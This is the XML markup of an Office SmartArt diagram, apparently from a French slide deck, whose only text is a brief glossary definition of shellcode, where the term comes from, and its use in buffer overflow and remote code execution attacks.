          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{952BCA89-25F7-45DA-A60D-E3CB9FFE260C}" type="parTrans" cxnId="{DDC90A97-81FA-4592-AC58-506C66EC2759}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{31C4EDAC-DF62-4AF2-BD93-EB6C5EBC9917}" type="sibTrans" cxnId="{DDC90A97-81FA-4592-AC58-506C66EC2759}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DB5DBF87-B1C1-9045-A2EC-DB918688DE39}" type="pres">
      <dgm:prSet presAssocID="{D1940A75-C6CC-4588-89AA-F2B5F21EF206}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EC371576-55BD-574A-A5F6-5DF7590CB35E}" type="pres">
      <dgm:prSet presAssocID="{840DA32E-7A45-4193-A660-D2A32EC1FE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94B7C6B-1226-A14E-B714-A015333D8182}" type="pres">
      <dgm:prSet presAssocID="{ACF096D1-78EF-4CCA-BC91-B777409C0D17}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{FC177785-8A47-CB4F-8464-392523598555}" type="pres">
      <dgm:prSet presAssocID="{B2A388F6-67EF-4B68-B8B5-E976FE3BAAE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A98ED31-0BB2-F94B-BBBF-71A4F518AF49}" type="pres">
      <dgm:prSet presAssocID="{A0B0596F-1AD3-4C37-ADEB-8E0229AE001F}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1E4239EF-9D65-4D47-92AE-5FD84F57BE0D}" type="pres">
      <dgm:prSet presAssocID="{D11E5E23-C3BA-4524-B57B-66BB8ADD76C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5D22C9-8326-4E45-BAA0-12FA47AACDF4}" type="pres">
      <dgm:prSet presAssocID="{9DD595D5-6FDD-40F8-B167-0001352D585F}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B69366A5-EF21-8E49-8AC3-1023C09F12B5}" type="pres">
      <dgm:prSet presAssocID="{092A4DC0-B4A0-4E5B-B1AB-9E02D7821EF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CFABE11-0778-E541-B502-AF0AC509D801}" type="presOf" srcId="{D11E5E23-C3BA-4524-B57B-66BB8ADD76C4}" destId="{1E4239EF-9D65-4D47-92AE-5FD84F57BE0D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{2EB13917-19AA-E146-9251-7C52527CF412}" type="presOf" srcId="{840DA32E-7A45-4193-A660-D2A32EC1FEAD}" destId="{EC371576-55BD-574A-A5F6-5DF7590CB35E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{F93DA262-3CEA-D44F-A62D-1375A9E0780D}" type="presOf" srcId="{092A4DC0-B4A0-4E5B-B1AB-9E02D7821EFB}" destId="{B69366A5-EF21-8E49-8AC3-1023C09F12B5}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{2579466D-0B90-497D-A4C9-9C1A8B2A5199}" srcId="{D1940A75-C6CC-4588-89AA-F2B5F21EF206}" destId="{D11E5E23-C3BA-4524-B57B-66BB8ADD76C4}" srcOrd="2" destOrd="0" parTransId="{439201AA-3A3A-46BB-A058-16C1FFF24850}" sibTransId="{9DD595D5-6FDD-40F8-B167-0001352D585F}"/>
    <dgm:cxn modelId="{8AA22C70-478F-43D8-B9CC-230022B4BCF1}" srcId="{D1940A75-C6CC-4588-89AA-F2B5F21EF206}" destId="{840DA32E-7A45-4193-A660-D2A32EC1FEAD}" srcOrd="0" destOrd="0" parTransId="{DBFEFDF5-65A5-410A-B6F2-6520CE6804D9}" sibTransId="{ACF096D1-78EF-4CCA-BC91-B777409C0D17}"/>
    <dgm:cxn modelId="{DDC90A97-81FA-4592-AC58-506C66EC2759}" srcId="{D1940A75-C6CC-4588-89AA-F2B5F21EF206}" destId="{092A4DC0-B4A0-4E5B-B1AB-9E02D7821EFB}" srcOrd="3" destOrd="0" parTransId="{952BCA89-25F7-45DA-A60D-E3CB9FFE260C}" sibTransId="{31C4EDAC-DF62-4AF2-BD93-EB6C5EBC9917}"/>
    <dgm:cxn modelId="{6E15FDB7-F830-49C0-A6A5-E13E5EEE8DCD}" srcId="{D1940A75-C6CC-4588-89AA-F2B5F21EF206}" destId="{B2A388F6-67EF-4B68-B8B5-E976FE3BAAE2}" srcOrd="1" destOrd="0" parTransId="{247C8559-415B-4A57-93BD-BC5223BA48D0}" sibTransId="{A0B0596F-1AD3-4C37-ADEB-8E0229AE001F}"/>
    <dgm:cxn modelId="{54F1FDD6-D3C2-9040-A22A-5737CE48F767}" type="presOf" srcId="{D1940A75-C6CC-4588-89AA-F2B5F21EF206}" destId="{DB5DBF87-B1C1-9045-A2EC-DB918688DE39}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{9A08BBEF-3B07-5A40-A2D1-0A15D619F5B8}" type="presOf" srcId="{B2A388F6-67EF-4B68-B8B5-E976FE3BAAE2}" destId="{FC177785-8A47-CB4F-8464-392523598555}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{A0AAB11B-53DB-C847-9D49-28038C516C29}" type="presParOf" srcId="{DB5DBF87-B1C1-9045-A2EC-DB918688DE39}" destId="{EC371576-55BD-574A-A5F6-5DF7590CB35E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{7C31F0E1-E04B-C245-A09C-608EEDA95F82}" type="presParOf" srcId="{DB5DBF87-B1C1-9045-A2EC-DB918688DE39}" destId="{E94B7C6B-1226-A14E-B714-A015333D8182}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{8F6AE397-EF0D-394C-83FB-32B6E2F7C44D}" type="presParOf" srcId="{DB5DBF87-B1C1-9045-A2EC-DB918688DE39}" destId="{FC177785-8A47-CB4F-8464-392523598555}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{C4DD7429-10DD-884C-BF34-6356CA0690DC}" type="presParOf" srcId="{DB5DBF87-B1C1-9045-A2EC-DB918688DE39}" destId="{2A98ED31-0BB2-F94B-BBBF-71A4F518AF49}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{DE5C7C27-3761-2D42-A58C-E63AA6E159A5}" type="presParOf" srcId="{DB5DBF87-B1C1-9045-A2EC-DB918688DE39}" destId="{1E4239EF-9D65-4D47-92AE-5FD84F57BE0D}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{6F5AF373-979A-3B4C-83E2-F891C4F82991}" type="presParOf" srcId="{DB5DBF87-B1C1-9045-A2EC-DB918688DE39}" destId="{6F5D22C9-8326-4E45-BAA0-12FA47AACDF4}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{C12504BD-1CD2-004A-9FC5-01BB50EB37A5}" type="presParOf" srcId="{DB5DBF87-B1C1-9045-A2EC-DB918688DE39}" destId="{B69366A5-EF21-8E49-8AC3-1023C09F12B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B8ADB5D6-64D2-4190-A580-1DA1B337B396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19647DA-3E6F-4D88-A6CF-2DAB503A69B5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Définition et explications</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{82547C25-105A-4BEA-B74E-0DE2CE76B2B7}" type="parTrans" cxnId="{3600FBE7-44A3-4716-92CB-E0D882A32571}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EC9FAD7D-EE1D-4464-9FF4-9DC4D5F773EC}" type="sibTrans" cxnId="{3600FBE7-44A3-4716-92CB-E0D882A32571}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8B914C8A-B196-468A-B012-28925393D47E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Définition :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{457C7557-EA96-48CC-9595-3B755220A089}" type="parTrans" cxnId="{75DADEBF-A961-4A98-8C58-69F72FE3AB73}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1A85476A-7976-4A7D-BCA9-02FC053212B6}" type="sibTrans" cxnId="{75DADEBF-A961-4A98-8C58-69F72FE3AB73}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1D35A9B6-FA48-4D4B-9C7C-0A3E3F636AF3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Code machine compact injecté dans un programme vulnérable pour exécuter une commande ou un exploit.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4FD7624A-B1BB-4AC3-9FDE-926A549A8636}" type="parTrans" cxnId="{59599690-F090-4723-967F-2D8551A5AF66}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{165D8AF5-B0C4-4BA1-9EFE-B2508265AB8E}" type="sibTrans" cxnId="{59599690-F090-4723-967F-2D8551A5AF66}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{15D7DA76-B1FC-445F-8E69-0B3F2325F19C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Origine du terme :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B43AA437-2AA9-4539-B6F2-F093013912A6}" type="parTrans" cxnId="{456B870B-3E7B-4B17-AC08-65F4DA3A7BA5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C211B3E0-1F0A-4AFF-AE50-CF4392F358B8}" type="sibTrans" cxnId="{456B870B-3E7B-4B17-AC08-65F4DA3A7BA5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{61F10E54-31AD-434A-96E7-01FF8F8F18F6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Le terme provient des codes initiaux utilisés pour ouvrir un shell (ex. : bash, cmd).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{98083933-BFE8-4279-8434-08A2B7990C14}" type="parTrans" cxnId="{DEE81ED9-2D7B-4C8B-9953-A554CB1FD8EB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3D6A27FB-6B88-4C8C-B080-A4422DC9AE63}" type="sibTrans" cxnId="{DEE81ED9-2D7B-4C8B-9953-A554CB1FD8EB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CD3F4AE2-9B55-44DB-824D-089792F56814}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Utilisation courante :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{06E84AFA-231B-41BF-8346-568642C163F0}" type="parTrans" cxnId="{933F9B5D-9B2A-44F6-8846-C64550C90674}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FA9DE457-ED68-4EB9-AD7F-A033E4A32356}" type="sibTrans" cxnId="{933F9B5D-9B2A-44F6-8846-C64550C90674}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5EE2FC9E-E06E-4F94-9B1B-36CD2D3EF035}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Dans les attaques de buffer overflow ou les RCE.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2C61F3BA-04A8-4284-9AE5-6815768F642B}" type="parTrans" cxnId="{1CA21A3A-3B94-4676-96AA-E5AD96CD4F95}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E12D45CF-8199-4A30-96ED-1E0402DFAFE8}" type="sibTrans" cxnId="{1CA21A3A-3B94-4676-96AA-E5AD96CD4F95}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{65B854E4-25B2-7847-BB8E-C27EB01E2097}" type="pres">
      <dgm:prSet presAssocID="{B8ADB5D6-64D2-4190-A580-1DA1B337B396}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D520B786-F344-CB48-A21C-6ECC92F4CAAB}" type="pres">
      <dgm:prSet presAssocID="{219647DA-3E6F-4D88-A6CF-2DAB503A69B5}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{2B9FE3B3-BFE5-524E-8CFA-DCE8BB57614A}" type="pres">
      <dgm:prSet presAssocID="{219647DA-3E6F-4D88-A6CF-2DAB503A69B5}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{473A0C19-D269-2943-9136-DEEE23465FEB}" type="pres">
      <dgm:prSet presAssocID="{219647DA-3E6F-4D88-A6CF-2DAB503A69B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27FDBCB-FF52-FF46-9295-20AD0A1CB3A7}" type="pres">
      <dgm:prSet presAssocID="{219647DA-3E6F-4D88-A6CF-2DAB503A69B5}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{944CD979-6FE5-F343-AA7B-F62D0900C401}" type="pres">
      <dgm:prSet presAssocID="{219647DA-3E6F-4D88-A6CF-2DAB503A69B5}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CEA8EF5B-E42D-DF4C-8CC9-58ACEAECD8D1}" type="pres">
      <dgm:prSet presAssocID="{EC9FAD7D-EE1D-4464-9FF4-9DC4D5F773EC}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{ECB30EAA-1EDC-A24A-B219-1F2BE82B7CEC}" type="pres">
      <dgm:prSet presAssocID="{8B914C8A-B196-468A-B012-28925393D47E}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B6C022FC-FB85-394E-BDD1-02B5D8F7E0E3}" type="pres">
      <dgm:prSet presAssocID="{8B914C8A-B196-468A-B012-28925393D47E}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{650A70BC-7F10-7745-84C2-70197B0C1977}" type="pres">
      <dgm:prSet presAssocID="{8B914C8A-B196-468A-B012-28925393D47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FF47E9E-790E-5146-8410-22C1D6834AC5}" type="pres">
      <dgm:prSet presAssocID="{8B914C8A-B196-468A-B012-28925393D47E}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5C400156-2FCE-024D-A603-08723439D8AB}" type="pres">
      <dgm:prSet presAssocID="{8B914C8A-B196-468A-B012-28925393D47E}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="1" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{44655199-8BEF-A64C-A436-BE9B3735B12C}" type="pres">
      <dgm:prSet presAssocID="{1A85476A-7976-4A7D-BCA9-02FC053212B6}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{0E469557-4822-6A43-876B-7E872A36B7C2}" type="pres">
      <dgm:prSet presAssocID="{15D7DA76-B1FC-445F-8E69-0B3F2325F19C}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{012A89E5-7DB6-004E-A924-798BE507926C}" type="pres">
      <dgm:prSet presAssocID="{15D7DA76-B1FC-445F-8E69-0B3F2325F19C}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4815005B-E46F-8A4A-A616-4252EB4CA96A}" type="pres">
      <dgm:prSet presAssocID="{15D7DA76-B1FC-445F-8E69-0B3F2325F19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2594E6A-BC7A-E440-9169-B6C61C2CEA02}" type="pres">
      <dgm:prSet presAssocID="{15D7DA76-B1FC-445F-8E69-0B3F2325F19C}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{22414C4A-4B00-B449-90BB-C0F320A8B717}" type="pres">
      <dgm:prSet presAssocID="{15D7DA76-B1FC-445F-8E69-0B3F2325F19C}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="2" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4466180E-AF49-B94E-A328-3C830164AC70}" type="pres">
      <dgm:prSet presAssocID="{C211B3E0-1F0A-4AFF-AE50-CF4392F358B8}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D1C7A627-BF91-D646-9922-2927E23239D0}" type="pres">
      <dgm:prSet presAssocID="{CD3F4AE2-9B55-44DB-824D-089792F56814}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F60C5BEC-53DF-5A44-935D-0E0DC462D19A}" type="pres">
      <dgm:prSet presAssocID="{CD3F4AE2-9B55-44DB-824D-089792F56814}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C76993A6-1902-FD48-922E-AB28AC18A33A}" type="pres">
      <dgm:prSet presAssocID="{CD3F4AE2-9B55-44DB-824D-089792F5681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11389F9-8538-6442-BBDA-9132A79972A7}" type="pres">
      <dgm:prSet presAssocID="{CD3F4AE2-9B55-44DB-824D-089792F56814}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7B3AE627-0078-BA40-BC40-705B21E3CD90}" type="pres">
      <dgm:prSet presAssocID="{CD3F4AE2-9B55-44DB-824D-089792F5681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56B870B-3E7B-4B17-AC08-65F4DA3A7BA5}" srcId="{B8ADB5D6-64D2-4190-A580-1DA1B337B396}" destId="{15D7DA76-B1FC-445F-8E69-0B3F2325F19C}" srcOrd="2" destOrd="0" parTransId="{B43AA437-2AA9-4539-B6F2-F093013912A6}" sibTransId="{C211B3E0-1F0A-4AFF-AE50-CF4392F358B8}"/>
    <dgm:cxn modelId="{E007CB12-6BBB-F64C-88FA-CEF406925923}" type="presOf" srcId="{219647DA-3E6F-4D88-A6CF-2DAB503A69B5}" destId="{473A0C19-D269-2943-9136-DEEE23465FEB}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{10D1C51C-D17A-9C4E-A8D3-EAD6B21C108C}" type="presOf" srcId="{5EE2FC9E-E06E-4F94-9B1B-36CD2D3EF035}" destId="{7B3AE627-0078-BA40-BC40-705B21E3CD90}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{45BB3A2B-349F-E647-9624-802BA1108FBB}" type="presOf" srcId="{15D7DA76-B1FC-445F-8E69-0B3F2325F19C}" destId="{012A89E5-7DB6-004E-A924-798BE507926C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8B26AB32-5A46-DF48-AAD1-5441AA07F8F2}" type="presOf" srcId="{8B914C8A-B196-468A-B012-28925393D47E}" destId="{650A70BC-7F10-7745-84C2-70197B0C1977}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1CA21A3A-3B94-4676-96AA-E5AD96CD4F95}" srcId="{CD3F4AE2-9B55-44DB-824D-089792F56814}" destId="{5EE2FC9E-E06E-4F94-9B1B-36CD2D3EF035}" srcOrd="0" destOrd="0" parTransId="{2C61F3BA-04A8-4284-9AE5-6815768F642B}" sibTransId="{E12D45CF-8199-4A30-96ED-1E0402DFAFE8}"/>
    <dgm:cxn modelId="{19AF6155-5526-3940-9B62-E259AE1EEAFB}" type="presOf" srcId="{15D7DA76-B1FC-445F-8E69-0B3F2325F19C}" destId="{4815005B-E46F-8A4A-A616-4252EB4CA96A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{933F9B5D-9B2A-44F6-8846-C64550C90674}" srcId="{B8ADB5D6-64D2-4190-A580-1DA1B337B396}" destId="{CD3F4AE2-9B55-44DB-824D-089792F56814}" srcOrd="3" destOrd="0" parTransId="{06E84AFA-231B-41BF-8346-568642C163F0}" sibTransId="{FA9DE457-ED68-4EB9-AD7F-A033E4A32356}"/>
    <dgm:cxn modelId="{89F58360-3DC5-F248-91E8-FC47AD89D5AD}" type="presOf" srcId="{1D35A9B6-FA48-4D4B-9C7C-0A3E3F636AF3}" destId="{5C400156-2FCE-024D-A603-08723439D8AB}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C108DB6E-E9A2-E14D-ABE2-6ACE7D455A0A}" type="presOf" srcId="{8B914C8A-B196-468A-B012-28925393D47E}" destId="{B6C022FC-FB85-394E-BDD1-02B5D8F7E0E3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{22A34F80-228E-264B-916F-2CE3D41AC9CF}" type="presOf" srcId="{CD3F4AE2-9B55-44DB-824D-089792F56814}" destId="{C76993A6-1902-FD48-922E-AB28AC18A33A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{906A3C81-5B07-7843-8FCF-0763B8D2394B}" type="presOf" srcId="{61F10E54-31AD-434A-96E7-01FF8F8F18F6}" destId="{22414C4A-4B00-B449-90BB-C0F320A8B717}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{59599690-F090-4723-967F-2D8551A5AF66}" srcId="{8B914C8A-B196-468A-B012-28925393D47E}" destId="{1D35A9B6-FA48-4D4B-9C7C-0A3E3F636AF3}" srcOrd="0" destOrd="0" parTransId="{4FD7624A-B1BB-4AC3-9FDE-926A549A8636}" sibTransId="{165D8AF5-B0C4-4BA1-9EFE-B2508265AB8E}"/>
    <dgm:cxn modelId="{75DADEBF-A961-4A98-8C58-69F72FE3AB73}" srcId="{B8ADB5D6-64D2-4190-A580-1DA1B337B396}" destId="{8B914C8A-B196-468A-B012-28925393D47E}" srcOrd="1" destOrd="0" parTransId="{457C7557-EA96-48CC-9595-3B755220A089}" sibTransId="{1A85476A-7976-4A7D-BCA9-02FC053212B6}"/>
    <dgm:cxn modelId="{D715F2CD-F58F-8F44-9B9F-E8621B1D2679}" type="presOf" srcId="{219647DA-3E6F-4D88-A6CF-2DAB503A69B5}" destId="{2B9FE3B3-BFE5-524E-8CFA-DCE8BB57614A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9CE6D3D2-005D-BF4E-A729-8B74F5BD3BB5}" type="presOf" srcId="{CD3F4AE2-9B55-44DB-824D-089792F56814}" destId="{F60C5BEC-53DF-5A44-935D-0E0DC462D19A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{DEE81ED9-2D7B-4C8B-9953-A554CB1FD8EB}" srcId="{15D7DA76-B1FC-445F-8E69-0B3F2325F19C}" destId="{61F10E54-31AD-434A-96E7-01FF8F8F18F6}" srcOrd="0" destOrd="0" parTransId="{98083933-BFE8-4279-8434-08A2B7990C14}" sibTransId="{3D6A27FB-6B88-4C8C-B080-A4422DC9AE63}"/>
    <dgm:cxn modelId="{3600FBE7-44A3-4716-92CB-E0D882A32571}" srcId="{B8ADB5D6-64D2-4190-A580-1DA1B337B396}" destId="{219647DA-3E6F-4D88-A6CF-2DAB503A69B5}" srcOrd="0" destOrd="0" parTransId="{82547C25-105A-4BEA-B74E-0DE2CE76B2B7}" sibTransId="{EC9FAD7D-EE1D-4464-9FF4-9DC4D5F773EC}"/>
